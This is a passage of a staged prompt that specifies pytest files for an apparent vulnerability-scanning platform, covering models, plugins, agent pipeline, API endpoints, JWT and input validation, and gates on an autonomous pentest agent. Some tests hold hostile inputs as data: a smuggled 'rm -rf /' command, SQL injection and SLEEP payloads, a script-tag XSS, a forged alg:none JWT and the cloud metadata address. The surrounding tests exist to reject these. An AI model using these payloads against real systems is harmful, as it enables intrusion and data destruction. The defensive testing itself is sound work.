  valid = ["PENDING","RUNNING","PAUSED","COMPLETED","FAILED","CANCELLED"]
  For each status:
    scan.status = status
    Assert: no exception raised

test_scan_progress_bounds():
  scan.progress = 0   → Assert no exception
  scan.progress = 100 → Assert no exception
  scan.progress = 50  → Assert no exception

test_scan_mode_enum():
  Assert: "CLASSIC" is valid ScanMode
  Assert: "HYBRID" is valid ScanMode
  Assert: "AUTONOMOUS" is valid ScanMode

─────────────────────────────────────────

class TestFindingModel:

test_finding_defaults():
  finding = Finding(title="Test", severity="HIGH")
  Assert: finding.is_false_positive == False
  Assert: finding.is_confirmed == False
  Assert: finding.status == "NEW"
  Assert: finding.ai_confidence is None

test_severity_enum_values():
  valid = ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]
  For each:
    finding.severity = severity
    Assert: no exception

test_owasp_category_format():
  valid_categories = [
    "A01:2025", "A02:2025", "A05:2025",
    "A07:2025", "A10:2025"
  ]
  For each:
    finding.owasp_category = cat
    Assert: stored correctly

─────────────────────────────────────────

class TestOrganizationModel:

test_scope_confirmed_defaults_false():
  org = Organization(name="Test Org", slug="test-org")
  Assert: org.authorized_scope_confirmed == False
  Assert: org.scope_confirmed_at is None
  Assert: org.scope_confirmed_by is None

test_scope_confirmation_sets_all_fields(db_session):
  @pytest.mark.integration
  org = OrganizationFactory()
  org.authorized_scope_confirmed = True
  org.scope_confirmed_at = datetime.utcnow()
  org.scope_confirmed_by = "Security Team"
  db_session.add(org)
  await db_session.commit()
  
  Reload org from DB
  Assert: org.authorized_scope_confirmed == True
  Assert: org.scope_confirmed_by == "Security Team"
  Assert: org.scope_confirmed_at is not None

─────────────────────────────────────────

class TestAuditLogModel:

test_audit_log_creates_correctly(db_session):
  @pytest.mark.integration
  from backend.models.audit_log import AuditLog
  
  record = AuditLog(
    action="strix_run_started",
    scan_id=uuid4(),
    phase="STRIX",
    severity="INFO",
    metadata={"target": "example.com", "cost": 2.5}
  )
  db_session.add(record)
  await db_session.commit()
  
  loaded = await db_session.get(AuditLog, record.id)
  Assert: loaded.action == "strix_run_started"
  Assert: loaded.metadata["target"] == "example.com"
  Assert: loaded.metadata["cost"] == 2.5

─────────────────────────────────────────

class TestDatabasePerformance:

@pytest.mark.integration
@pytest.mark.slow
test_bulk_subdomain_insert_speed(db_session):
  subdomains = [
    SubdomainFactory.build(scan_id=uuid4())
    for _ in range(1000)
  ]
  
  start = asyncio.get_event_loop().time()
  db_session.add_all(subdomains)
  await db_session.commit()
  duration = asyncio.get_event_loop().time() - start
  
  Assert: duration < 5.0 seconds
  
  count = await db_session.execute(
    select(func.count(Subdomain.id))
  )
  Assert: count.scalar() == 1000

test_finding_query_with_filters(db_session):
  @pytest.mark.integration
  scan_id = uuid4()
  
  FindingFactory.create_batch(5, scan_id=scan_id, severity="CRITICAL")
  FindingFactory.create_batch(10, scan_id=scan_id, severity="HIGH")
  FindingFactory.create_batch(3, scan_id=scan_id, severity="MEDIUM",
                               is_false_positive=True)
  await db_session.commit()
  
  result = await db_session.execute(
    select(Finding)
    .where(Finding.scan_id == scan_id)
    .where(Finding.severity == "CRITICAL")
    .where(Finding.is_false_positive == False)
  )
  findings = result.scalars().all()
  
  Assert: len(findings) == 5
  Assert: all(f.severity == "CRITICAL" for f in findings)

Generate tests/test_models.py only. Stop after.
```

---

### Step 14.3 — Plugin System Tests

```
PHASE 14 — STEP 3

Generate: tests/test_plugins.py

─────────────────────────────────────────

class TestBasePlugin:

@pytest.mark.unit
test_plugin_timeout_returns_output_not_exception():
  Create a mock plugin where subprocess sleeps 999s
  Set timeout = 1 second
  
  output = await plugin.run(mock_input)
  
  Assert: isinstance(output, PluginOutput)
  Assert: output.success == False
  Assert: "TIMEOUT" in output.error_message
  Assert: No exception propagated to caller

@pytest.mark.unit
test_plugin_crash_returns_output_not_exception():
  Create mock plugin where subprocess raises OSError
  
  output = await plugin.run(mock_input)
  
  Assert: output.success == False
  Assert: output.error_message is not None
  Assert: No exception propagated

@pytest.mark.unit
test_quality_score_zero_results():
  output = PluginOutput(success=True, record_count=0,
                        execution_time=5.0)
  plugin._calculate_quality_score(output)
  Assert: output.quality_score < 0.3

@pytest.mark.unit
test_quality_score_good_results():
  output = PluginOutput(success=True, record_count=20,
                        execution_time=30.0)
  plugin._calculate_quality_score(output)
  Assert: output.quality_score >= 0.5

@pytest.mark.unit
test_raw_output_always_saved():
  Run any plugin (mock subprocess)
  Assert: output.raw_output is not None
  Assert: len(output.raw_output) >= 0

─────────────────────────────────────────

class TestSubfinderPlugin:

@pytest.mark.unit
test_parse_valid_json_output():
  raw = '\n'.join([
    '{"host":"api.example.com","source":["subfinder"]}',
    '{"host":"admin.example.com","source":["passive"]}',
    'invalid json line that should be skipped',
    '',
  ])
  results = subfinder.parse_output(raw)
  
  Assert: len(results) == 2
  Assert: results[0]["subdomain"] == "api.example.com"
  Assert: results[0]["source"] == ["subfinder"]
  Assert: results[0]["tool"] == "subfinder"

@pytest.mark.unit
test_build_command_has_required_flags():
  cmd = subfinder.build_command(mock_input)
  
  Assert: "subfinder" in cmd[0]
  Assert: "-d" in cmd
  Assert: "example.com" in cmd
  Assert: "-json" in cmd
  Assert: "-silent" in cmd

@pytest.mark.unit
test_parse_empty_output():
  results = subfinder.parse_output("")
  Assert: results == []
  (No exception)

─────────────────────────────────────────

class TestNucleiPlugin:

@pytest.mark.unit
test_parse_single_finding():
  import json
  raw = json.dumps({
    "template-id": "CVE-2021-44228",
    "info": {
      "name": "Log4Shell RCE",
      "severity": "critical",
      "description": "Remote code execution via Log4j",
      "cvss-score": 10.0,
      "cve-id": "CVE-2021-44228",
      "cwe-id": "CWE-917",
      "tags": ["cve","rce","log4j"]
    },
    "matched-at": "https://example.com/login",
    "extracted-results": ["10.0.0.1"],
    "request": "POST /login HTTP/1.1\nHost: example.com",
    "response": "HTTP/1.1 200 OK\nContent-Type: text/html"
  })
  
  results = nuclei.parse_output(raw)
  
  Assert: len(results) == 1
  Assert: results[0]["severity"] == "CRITICAL"
  Assert: results[0]["cve_id"] == "CVE-2021-44228"
  Assert: results[0]["cvss_score"] == 10.0
  Assert: results[0]["cwe_id"] == "CWE-917"
  Assert: results[0]["affected_url"] == "https://example.com/login"

@pytest.mark.unit
test_parse_malformed_json_returns_empty():
  results = nuclei.parse_output("not json {{{")
  Assert: results == []

─────────────────────────────────────────

class TestJSSecretExtractor:

@pytest.mark.unit
test_finds_aws_access_key():
  content = "const awsKey = 'AKIAIOSFODNN7EXAMPLE123456';"
  findings = extractor._regex_extract(content, "app.js")
  
  aws_findings = [f for f in findings
                  if f.secret_type == "aws_access_key"]
  
  Assert: len(aws_findings) >= 1
  Assert: aws_findings[0].severity == "CRITICAL"
  # Key must be truncated — never log full key
  Assert: len(aws_findings[0].raw_match) <= 15
  Assert: "..." in aws_findings[0].raw_match

@pytest.mark.unit
test_finds_google_api_key():
  content = "apiKey: 'AIzaSyDummyKeyXXXXXXXXXXXXXXXXXXXXXXX';"
  findings = extractor._regex_extract(content, "config.js")
  
  Assert: any(f.secret_type == "google_api_key" for f in findings)

@pytest.mark.unit
test_finds_jwt_token():
  jwt = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
         "eyJzdWIiOiIxMjM0NTY3ODkwIn0."
         "SflKxwRJSMeKKF2QT4fwpMeJf36POkfyJV_adQssw5c")
  content = f"const token = '{jwt}';"
  findings = extractor._regex_extract(content, "auth.js")
  
  Assert: any(f.secret_type == "jwt_token" for f in findings)

@pytest.mark.unit
test_skips_placeholder_values():
  placeholders = [
    "const key = 'your_api_key_here';",
    "const secret = 'changeme';",
    "const pass = 'placeholder';",
    "const token = 'xxxxxxxxxxxx';",
    "const key = 'your-secret';",
  ]
  For each placeholder:
    findings = extractor._regex_extract(placeholder, "test.js")
    Assert: len(findings) == 0

@pytest.mark.unit
test_finds_stripe_live_key():
  content = "stripeKey = 'STRIPE_SECRET_REDACTED';"
  findings = extractor._regex_extract(content, "payment.js")
  
  stripe_findings = [f for f in findings
                     if f.secret_type == "stripe_key"]
  Assert: len(stripe_findings) >= 1
  Assert: stripe_findings[0].severity == "CRITICAL"

─────────────────────────────────────────

class TestPluginRegistry:

@pytest.mark.unit
test_auto_discover_finds_minimum_plugins():
  registry.auto_discover()
  plugins = registry.list_all()
  
  Assert: len(plugins) >= 30
  
  required = [
    "subfinder", "amass", "httpx_plugin", "naabu",
    "nmap_plugin", "nuclei_plugin", "sqlmap_plugin",
    "dalfox", "trufflehog", "gitleaks", "s3scanner",
    "katana", "ffuf_plugin", "wpscan_plugin"
  ]
  For each name in required:
    Assert: registry.is_registered(name)

@pytest.mark.unit
test_all_fallback_plugins_are_registered():
  registry.auto_discover()
  
  For each plugin in registry.list_all():
    fallback = plugin.metadata.fallback_plugin
    If fallback is not None:
      Assert: registry.is_registered(fallback), \
        f"{plugin.metadata.name} fallback '{fallback}' not registered"

@pytest.mark.unit
test_strix_plugin_registered_with_correct_category():
  registry.auto_discover()
  strix = registry.get("strix_plugin")
  
  Assert: strix.metadata.category == "AUTONOMOUS"
  Assert: strix.metadata.fallback_plugin is None
  Assert: strix.metadata.default_timeout >= 3600

Generate tests/test_plugins.py only. Stop after.
```

---

### Step 14.4 — Agent Pipeline Tests

```
PHASE 14 — STEP 4

Generate: tests/test_pipeline.py

─────────────────────────────────────────

class TestReconAgent:

@pytest.mark.agent
test_recon_agent_stores_subdomains(
  mock_executor, db_session, fake_redis):

  mock_executor.run.side_effect = [
    # subfinder returns 5 subdomains
    PluginOutput(success=True, parsed_data=[
      {"subdomain": f"sub{i}.example.com",
       "source": ["subfinder"], "tool": "subfinder"}
      for i in range(5)
    ], record_count=5, execution_time=10.0, quality_score=0.9),
    # amass returns 3 (2 overlap with subfinder)
    PluginOutput(success=True, parsed_data=[
      {"subdomain": f"sub{i}.example.com",
       "source": ["amass"], "tool": "amass"}
      for i in range(3)
    ], record_count=3, execution_time=15.0, quality_score=0.9),
    # dnsx, whois, asnmap returns
    *[PluginOutput(success=True, parsed_data=[],
                   record_count=0, execution_time=2.0,
                   quality_score=0.5) for _ in range(5)]
  ]
  
  scan = ScanFactory(target="example.com")
  db_session.add(scan)
  await db_session.commit()
  
  result = await _async_start_recon(
    MagicMock(), str(scan.id), "example.com", []
  )
  
  Assert: result["subdomain_count"] == 5
    (5 unique after dedup of 5+3 with 3 overlap)
  
  subdomains = (await db_session.execute(
    select(Subdomain).where(Subdomain.scan_id == scan.id)
  )).scalars().all()
  Assert: len(subdomains) == 5

@pytest.mark.agent
test_recon_continues_after_single_tool_failure(
  mock_executor, db_session):

  mock_executor.run.side_effect = [
    PluginOutput(success=False, error_message="Tool not found",
                 parsed_data=[], record_count=0,
                 execution_time=0.1, quality_score=0.0),
    PluginOutput(success=True, parsed_data=[
      {"subdomain": "api.example.com", "source": ["amass"],
       "tool": "amass"}
    ], record_count=1, execution_time=20.0, quality_score=0.9),
    *[PluginOutput(success=True, parsed_data=[],
                   record_count=0, execution_time=1.0,
                   quality_score=0.5) for _ in range(8)]
  ]
  
  scan = ScanFactory(target="example.com")
  db_session.add(scan)
  await db_session.commit()
  
  # Should NOT raise even though first tool failed
  result = await _async_start_recon(
    MagicMock(), str(scan.id), "example.com", []
  )
  
  Assert: result is not None
  Assert: result["subdomain_count"] >= 1
  Assert: "subfinder" in result.get("tools_failed", [])
    OR result["tools_failed"] is not None

─────────────────────────────────────────

class TestVulnAgent:

@pytest.mark.agent
test_decision_engine_selects_wpscan_for_wordpress():
  from backend.workers.processors.context_builder import ScanContext
  from backend.orchestrator.decision_engine import DecisionEngine
  
  context = ScanContext(
    scan_id="test",
    target="example.com",
    has_wordpress=True,
    has_parameters=True,
    has_login_page=True,
    has_api_endpoints=False,
    has_graphql=False,
    open_ports=[80, 443],
    discovered_technologies=["WordPress"],
    subdomain_count=5,
    endpoint_count=20,
    scan_type="FULL"
  )
  
  engine = DecisionEngine()
  tools = engine.decide_vuln_tools(context)
  tool_names = [t.tool_name for t in tools]
  
  Assert: "wpscan_plugin" in tool_names
  Assert: "nuclei_plugin" in tool_names
  Assert: "dalfox" in tool_names

@pytest.mark.agent
test_vuln_validator_catches_favicon_false_positive():
  from backend.workers.processors.vuln_validator import VulnValidator
  
  finding = {
    "title": "Missing X-Frame-Options Header",
    "severity": "INFO",
    "affected_url": "https://example.com/favicon.ico",
    "evidence": None,
    "request": None,
    "response": None
  }
  
  validator = VulnValidator()
  result = validator.validate_single(finding)
  
  Assert: result.confidence < 0.3
  Assert: result.is_valid == False

@pytest.mark.agent
test_vuln_validator_confirms_sqli_with_evidence():
  finding = {
    "title": "SQL Injection",
    "severity": "HIGH",
    "affected_url": "https://example.com/login",
    "affected_parameter": "username",
    "evidence": "Time-based blind SQLi: sleep(5) caused 5s delay",
    "request": "POST /login username=1'%20OR%20SLEEP(5)--",
    "response": "HTTP/1.1 200 OK [delayed 5000ms]"
  }
  
  validator = VulnValidator()
  result = validator.validate_single(finding)
  
  Assert: result.confidence >= 0.7
  Assert: result.is_valid == True

@pytest.mark.agent
test_chain_detection_xss_plus_no_httponly():
  findings_data = [
    {
      "title": "Reflected XSS",
      "severity": "HIGH",
      "affected_url": "https://example.com/search",
      "evidence": "XSS confirmed", "request": "GET ...",
      "response": "<script>alert(1)</script>"
    },
    {
      "title": "Session Cookie Missing HttpOnly Flag",
      "severity": "MEDIUM",
      "affected_url": "https://example.com",
      "evidence": "Set-Cookie: session=abc; Path=/",
      "request": None, "response": None
    }
  ]
  
  validator = VulnValidator()
  validated = [validator.validate_single(f) for f in findings_data]
  chains = validator.detect_chains(validated)
  
  Assert: len(chains) >= 1
  chain_titles = [c.title for c in chains]
  Assert: any("Session" in t or "XSS" in t for t in chain_titles)
  Assert: chains[0].severity == "CRITICAL"

─────────────────────────────────────────

class TestOWASPMapper:

@pytest.mark.unit
test_owasp_mapper_all_common_types():
  mapper = OWASPMapper()
  
  test_cases = [
    ("SQL Injection in login form",    "A05:2025", "CWE-89"),
    ("Cross-Site Scripting (XSS)",     "A05:2025", "CWE-79"),
    ("CORS Misconfiguration",          "A02:2025", "CWE-942"),
    ("JWT Algorithm None Attack",      "A07:2025", "CWE-347"),
    ("Missing Security Headers",       "A02:2025", "CWE-693"),
    ("IDOR Broken Access Control",     "A01:2025", "CWE-639"),
    ("SSRF Server-Side Request Forgery","A01:2025", "CWE-918"),
    ("Command Injection",              "A05:2025", "CWE-78"),
    ("Exposed .git Repository",        "A02:2025", "CWE-538"),
    ("Public S3 Bucket",               "A02:2025", "CWE-732"),
    ("Default Credentials Used",       "A07:2025", "CWE-521"),
    ("Subdomain Takeover",             "A02:2025", "CWE-923"),
  ]
  
  For each (title, expected_owasp, expected_cwe):
    result = mapper.map({"title": title, "severity": "HIGH"})
    Assert: result.owasp_category == expected_owasp, \
      f"Failed for '{title}': got {result.owasp_category}"
    Assert: result.cwe_id == expected_cwe, \
      f"Failed for '{title}': got {result.cwe_id}"

─────────────────────────────────────────

class TestReportAgent:

@pytest.mark.agent
test_report_generates_pdf_file(
  mock_claude_api, db_session, completed_scan):

  from backend.workers.report_agent import _async_start_report
  import os, tempfile
  
  with tempfile.TemporaryDirectory() as tmpdir:
    with patch("backend.reports.pdf_builder.OUTPUT_DIR", tmpdir):
      result = await _async_start_report(
        MagicMock(), str(completed_scan.id)
      )
  
  Assert: result["status"] == "complete"
  Assert: "pdf_path" in result
  Assert: os.path.exists(result["pdf_path"])
  Assert: os.path.getsize(result["pdf_path"]) > 10000

@pytest.mark.agent
test_report_without_ai_still_completes(db_session, completed_scan):
  With patch claude API to raise httpx.ConnectError:
    result = await _async_start_report(
      MagicMock(), str(completed_scan.id)
    )
  
  Assert: result["status"] == "complete"
    (PDF generated with fallback text)
  
  Reload scan from DB
  Assert: scan.status == "COMPLETED"
  Assert: scan.progress == 100

Generate tests/test_pipeline.py only. Stop after.
```

---

### Step 14.5 — API Endpoint Tests

```
PHASE 14 — STEP 5

Generate: tests/test_api.py

─────────────────────────────────────────

class TestAuthEndpoints:

@pytest.mark.api
test_register_creates_user_and_returns_token(api_client):
  response = api_client.post("/api/v1/auth/register", json={
    "email": "new@test.com",
    "username": "newuser",
    "password": "SecurePass123!"
  })
  Assert: response.status_code == 200
  data = response.json()["data"]
  Assert: "access_token" in data
  Assert: "refresh_token" in data
  Assert: data["token_type"] == "bearer"

@pytest.mark.api
test_register_rejects_weak_password(api_client):
  response = api_client.post("/api/v1/auth/register", json={
    "email": "x@test.com", "username": "x", "password": "abc"
  })
  Assert: response.status_code == 422

@pytest.mark.api
test_register_rejects_duplicate_email(api_client):
  payload = {"email": "dup@test.com", "username": "u1",
             "password": "SecurePass123!"}
  api_client.post("/api/v1/auth/register", json=payload)
  response2 = api_client.post("/api/v1/auth/register", json={
    **payload, "username": "u2"
  })
  Assert: response2.status_code == 409

@pytest.mark.api
test_login_returns_tokens(api_client, auth_headers):
  response = api_client.post("/api/v1/auth/login", json={
    "email": "test@agentsec.ai",
    "password": "TestPass123!"
  })
  Assert: response.status_code == 200
  Assert: "access_token" in response.json()["data"]

@pytest.mark.api
test_login_wrong_password_returns_401(api_client):
  response = api_client.post("/api/v1/auth/login", json={
    "email": "test@agentsec.ai",
    "password": "WrongPass!"
  })
  Assert: response.status_code == 401
  # Must not reveal that password is wrong specifically
  msg = response.json()["detail"]["message"].lower()
  Assert: "wrong" not in msg
  Assert: "invalid credentials" in msg or "unauthorized" in msg

@pytest.mark.api
test_protected_endpoint_requires_auth(api_client):
  response = api_client.get("/api/v1/scans")
  Assert: response.status_code == 401

@pytest.mark.api
test_me_endpoint_returns_current_user(api_client, auth_headers):
  response = api_client.get("/api/v1/auth/me",
                            headers=auth_headers)
  Assert: response.status_code == 200
  Assert: "email" in response.json()["data"]
  Assert: "username" in response.json()["data"]

─────────────────────────────────────────

class TestScanEndpoints:

@pytest.mark.api
test_create_scan_valid_domain(api_client, auth_headers):
  response = api_client.post("/api/v1/scans",
    headers=auth_headers,
    json={"target": "example.com", "scan_type": "FULL"})
  Assert: response.status_code == 200
  data = response.json()["data"]
  Assert: data["target"] == "example.com"
  Assert: data["status"] == "PENDING"
  Assert: data["scan_mode"] == "CLASSIC"

@pytest.mark.api
test_create_scan_strips_http_prefix(api_client, auth_headers):
  response = api_client.post("/api/v1/scans",
    headers=auth_headers,
    json={"target": "https://example.com/"})
  Assert: response.status_code == 200
  Assert: response.json()["data"]["target"] == "example.com"

@pytest.mark.api
@pytest.mark.parametrize("bad_target", [
  "localhost",
  "127.0.0.1",
  "192.168.1.1",
  "10.0.0.1",
  "172.16.0.1",
  "0.0.0.0",
  "169.254.169.254",
  "::1",
  "<script>alert(1)</script>",
  "'; DROP TABLE scans;--",
  "example.com; rm -rf /",
])
test_create_scan_rejects_dangerous_targets(
  api_client, auth_headers, bad_target):
  response = api_client.post("/api/v1/scans",
    headers=auth_headers,
    json={"target": bad_target})
  Assert: response.status_code in [400, 422]

@pytest.mark.api
test_list_scans_pagination(api_client, auth_headers, db_session):
  For i in range(25):
    ScanFactory(target=f"target{i}.com",
                status="COMPLETED")
  await db_session.commit()
  
  response = api_client.get(
    "/api/v1/scans?page=1&page_size=10",
    headers=auth_headers
  )
  Assert: response.status_code == 200
  pagination = response.json()["pagination"]
  Assert: len(response.json()["data"]) == 10
  Assert: pagination["total"] >= 25
  Assert: pagination["total_pages"] >= 3

@pytest.mark.api
test_create_hybrid_scan_requires_strix_enabled(
  api_client, auth_headers):
  With settings.strix.enabled = False:
    response = api_client.post("/api/v1/scans",
      headers=auth_headers,
      json={"target": "example.com", "scan_mode": "hybrid"})
    Assert: response.status_code == 403
    Assert: "STRIX_DISABLED" in response.json()["detail"]["code"]

@pytest.mark.api
test_create_hybrid_scan_requires_scope_confirmation(
  api_client, auth_headers, db_session):
  org.authorized_scope_confirmed = False
  await db_session.commit()
  
  With settings.strix.enabled = True:
    response = api_client.post("/api/v1/scans",
      headers=auth_headers,
      json={"target": "example.com", "scan_mode": "hybrid"})
    Assert: response.status_code == 403
    Assert: "SCOPE_NOT_CONFIRMED" in response.json()["detail"]["code"]

─────────────────────────────────────────

class TestFindingEndpoints:

@pytest.mark.api
test_list_findings_filters_by_severity(
  api_client, auth_headers, db_session, completed_scan):

  response = api_client.get(
    f"/api/v1/findings/scans/{completed_scan.id}/findings"
    "?severity=CRITICAL",
    headers=auth_headers
  )
  Assert: response.status_code == 200
  findings = response.json()["data"]
  Assert: all(f["severity"] == "CRITICAL" for f in findings)

@pytest.mark.api
test_list_findings_excludes_false_positives_by_default(
  api_client, auth_headers, db_session, completed_scan):

  FindingFactory(scan_id=completed_scan.id,
                 is_false_positive=True)
  await db_session.commit()
  
  response = api_client.get(
    f"/api/v1/findings/scans/{completed_scan.id}/findings",
    headers=auth_headers
  )
  findings = response.json()["data"]
  Assert: all(not f["is_false_positive"] for f in findings)

@pytest.mark.api
test_mark_false_positive(
  api_client, auth_headers, db_session, completed_scan):

  finding = (await db_session.execute(
    select(Finding).where(Finding.scan_id == completed_scan.id)
    .limit(1)
  )).scalar_one()
  
  response = api_client.patch(
    f"/api/v1/findings/{finding.id}",
    headers=auth_headers,
    json={"is_false_positive": True}
  )
  Assert: response.status_code == 200
  
  await db_session.refresh(finding)
  Assert: finding.is_false_positive == True
  Assert: finding.status == "FALSE_POSITIVE"

@pytest.mark.api
test_findings_export_csv(
  api_client, auth_headers, completed_scan):

  response = api_client.get(
    f"/api/v1/findings/scans/{completed_scan.id}"
    "/findings/export?format=csv",
    headers=auth_headers
  )
  Assert: response.status_code == 200
  Assert: "text/csv" in response.headers["content-type"]
  
  lines = response.text.strip().split("\n")
  Assert: len(lines) >= 2 (header + at least 1 finding)
  Assert: "title" in lines[0].lower()
  Assert: "severity" in lines[0].lower()

Generate tests/test_api.py only. Stop after.
```

---

### Step 14.6 — Security Self-Tests

```
PHASE 14 — STEP 6

Generate: tests/test_security.py

─────────────────────────────────────────

class TestJWTSecurity:

@pytest.mark.security
test_alg_none_attack_rejected(api_client):
  import base64, json
  
  header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
  ).rstrip(b"=").decode()
  payload = base64.urlsafe_b64encode(
    json.dumps({"sub": str(uuid4()),
                "role": "ADMIN",
                "exp": 9999999999}).encode()
  ).rstrip(b"=").decode()
  
  fabricated = f"{header}.{payload}."
  
  response = api_client.get(
    "/api/v1/scans",
    headers={"Authorization": f"Bearer {fabricated}"}
  )
  Assert: response.status_code == 401

@pytest.mark.security
test_expired_token_rejected(api_client):
  from backend.api.dependencies import create_access_token
  
  token = create_access_token(
    {"sub": str(uuid4())},
    expires_delta=timedelta(seconds=-1)
  )
  response = api_client.get(
    "/api/v1/scans",
    headers={"Authorization": f"Bearer {token}"}
  )
  Assert: response.status_code == 401

@pytest.mark.security
test_wrong_secret_rejected(api_client):
  import jwt
  token = jwt.encode(
    {"sub": str(uuid4()), "exp": datetime.utcnow() + timedelta(hours=1)},
    "wrong_secret_key",
    algorithm="HS256"
  )
  response = api_client.get(
    "/api/v1/scans",
    headers={"Authorization": f"Bearer {token}"}
  )
  Assert: response.status_code == 401

@pytest.mark.security
test_token_blacklisted_after_logout(api_client, auth_headers):
  response1 = api_client.get("/api/v1/auth/me",
                             headers=auth_headers)
  Assert: response1.status_code == 200
  
  api_client.post("/api/v1/auth/logout", headers=auth_headers)
  
  response2 = api_client.get("/api/v1/auth/me",
                             headers=auth_headers)
  Assert: response2.status_code == 401

─────────────────────────────────────────

class TestInputValidation:

@pytest.mark.security
@pytest.mark.parametrize("private_ip", [
  "10.0.0.1", "172.16.0.1", "192.168.1.1",
  "127.0.0.1", "::1", "0.0.0.0",
  "169.254.169.254", "fc00::1", "fd00::1",
])
test_private_ips_rejected(api_client, auth_headers, private_ip):
  response = api_client.post("/api/v1/scans",
    headers=auth_headers,
    json={"target": private_ip})
  Assert: response.status_code in [400, 422]

@pytest.mark.security
test_sql_injection_in_target_rejected(api_client, auth_headers):
  response = api_client.post("/api/v1/scans",
    headers=auth_headers,
    json={"target": "'; DROP TABLE scans;--"})
  Assert: response.status_code in [400, 422]
  
  # Verify tables still exist
  scan_count = await db_session.execute(
    select(func.count(Scan.id))
  )
  Assert: scan_count.scalar() >= 0

@pytest.mark.security
test_xss_in_target_rejected(api_client, auth_headers):
  response = api_client.post("/api/v1/scans",
    headers=auth_headers,
    json={"target": "<script>alert(1)</script>"})
  Assert: response.status_code in [400, 422]

─────────────────────────────────────────

class TestIDOR:

@pytest.mark.security
test_user_cannot_access_other_users_scan(api_client, db_session):
  # User A creates scan
  response_a = api_client.post("/api/v1/auth/register", json={
    "email": "usera@test.com", "username": "usera",
    "password": "SecurePass123!"
  })
  token_a = response_a.json()["data"]["access_token"]
  
  scan = api_client.post("/api/v1/scans",
    headers={"Authorization": f"Bearer {token_a}"},
    json={"target": "example.com"})
  scan_id = scan.json()["data"]["id"]
  
  # User B registers and tries to access User A's scan
  response_b = api_client.post("/api/v1/auth/register", json={
    "email": "userb@test.com", "username": "userb",
    "password": "SecurePass123!"
  })
  token_b = response_b.json()["data"]["access_token"]
  
  response = api_client.get(
    f"/api/v1/scans/{scan_id}",
    headers={"Authorization": f"Bearer {token_b}"}
  )
  Assert: response.status_code in [403, 404]

@pytest.mark.security
test_secrets_never_returned_in_full(
  api_client, auth_headers, db_session, completed_scan):

  full_key = "AKIAIOSFODNN7EXAMPLE1234567890AB"
  finding = FindingFactory(
    scan_id=completed_scan.id,
    tool_found_by="trufflehog",
    evidence=f"Found AWS key: {full_key}",
    title="AWS Access Key Exposed"
  )
  db_session.add(finding)
  await db_session.commit()
  
  response = api_client.get(
    f"/api/v1/findings/{finding.id}",
    headers=auth_headers
  )
  response_text = response.text
  
  # Full key must NEVER appear in API response
  Assert: full_key not in response_text

@pytest.mark.security
test_pdf_path_not_exposed_in_api(
  api_client, auth_headers, completed_scan):

  response = api_client.get(
    f"/api/v1/scans/{completed_scan.id}/report",
    headers=auth_headers
  )
  response_text = response.text
  
  Assert: "/tmp/" not in response_text
  Assert: "/reports/output/" not in response_text

Generate tests/test_security.py only. Stop after.
```

---

### Step 14.7 — Strix Tests

```
PHASE 14 — STEP 7

Generate: tests/test_strix.py

─────────────────────────────────────────

class TestStrixPlugin:

@pytest.mark.strix
test_build_command_always_includes_safety_flags():
  plugin = registry.get("strix_plugin")
  cmd = plugin.build_command(PluginInput(
    scan_id="test", target="example.com",
    extra_params={}, timeout=60
  ))
  Assert: "--non-interactive" in cmd
  Assert: "--max-budget" in cmd
  Assert: "--max-turns" in cmd
  Assert: "--run-name" in cmd
  # Must ALWAYS be non-interactive, no exceptions
  Assert: cmd.count("--non-interactive") == 1

@pytest.mark.strix
test_parse_vulnerabilities_json():
  raw = """[vulnerabilities.json]
[
  {
    "id": "vuln-0001",
    "title": "SQL Injection in /api/login",
    "severity": "high",
    "description": "Vulnerable to time-based SQLi",
    "endpoint": "https://example.com/api/login",
    "evidence": "sleep(5) caused 5 second delay",
    "poc_description": "Send: username=1' OR SLEEP(5)--",
    "poc_script_code": "import requests\\nr = requests.post(...)",
    "remediation_steps": "Use parameterized queries",
    "cvss": 8.2,
    "cwe": "CWE-89"
  }
]
"""
  results = plugin.parse_output(raw)
  
  Assert: len(results) == 1
  Assert: results[0]["severity"] == "HIGH"
  Assert: results[0]["cwe_id"] == "CWE-89"
  Assert: results[0]["cvss_score"] == 8.2
  Assert: "Evidence" in results[0]["evidence"]
  Assert: "PoC Description" in results[0]["evidence"]
  Assert: "PoC Script" in results[0]["evidence"]
  Assert: results[0]["is_confirmed"] == True
    (because poc_script_code is present)

@pytest.mark.strix
test_parse_malformed_json_returns_empty():
  raw = "[vulnerabilities.json]\n{{{not valid json"
  results = plugin.parse_output(raw)
  Assert: results == []

@pytest.mark.strix
test_parse_missing_section_marker_returns_empty():
  raw = "Strix output without any section markers here"
  results = plugin.parse_output(raw)
  Assert: results == []

@pytest.mark.strix
test_severity_mapping_all_values():
  cases = [
    ("critical", "CRITICAL"),
    ("high", "HIGH"),
    ("medium", "MEDIUM"),
    ("low", "LOW"),
    ("info", "INFO"),
    ("informational", "INFO"),
    ("none", "INFO"),
    ("CRITICAL", "CRITICAL"),
    ("HIGH", "HIGH"),
  ]
  For each (input_sev, expected):
    raw = f'[vulnerabilities.json]\n[{{"id":"v1","title":"T","severity":"{input_sev}"}}]'
    results = plugin.parse_output(raw)
    If results:
      Assert: results[0]["severity"] == expected

─────────────────────────────────────────

class TestStrixAgentGates:

@pytest.mark.strix
test_gate1_disabled_by_default(db_session, fake_redis):
  With settings patched: strix.enabled = False:
    result = await _async_start_strix(
      MagicMock(), str(uuid4()), {}
    )
  
  Assert: result["status"] == "disabled"

@pytest.mark.strix
test_gate2_blocked_without_org_consent(db_session, fake_redis):
  With settings: strix.enabled = True:
    org = OrganizationFactory(authorized_scope_confirmed=False)
    db_session.add(org)
    scan = ScanFactory(organization_id=org.id)
    db_session.add(scan)
    await db_session.commit()
    
    result = await _async_start_strix(
      MagicMock(), str(scan.id), {}
    )
  
  Assert: result["status"] == "blocked_unauthorized"

@pytest.mark.strix
test_gate3_blocked_for_private_ip(db_session, fake_redis):
  With settings: strix.enabled = True:
    org = OrganizationFactory(authorized_scope_confirmed=True)
    scan = ScanFactory(target="192.168.1.1",
                       organization_id=org.id)
    db_session.add_all([org, scan])
    await db_session.commit()
    
    result = await _async_start_strix(
      MagicMock(), str(scan.id), {}
    )
  
  Assert: result["status"] == "blocked_scope"

@pytest.mark.strix
test_max_retries_zero():
  from backend.workers.strix_agent import start_strix
  Assert: start_strix.max_retries == 0
  # Absolute rule: never retry autonomous agent runs

─────────────────────────────────────────

class TestStrixNormalizer:

@pytest.mark.strix
test_normalize_builds_rich_evidence():
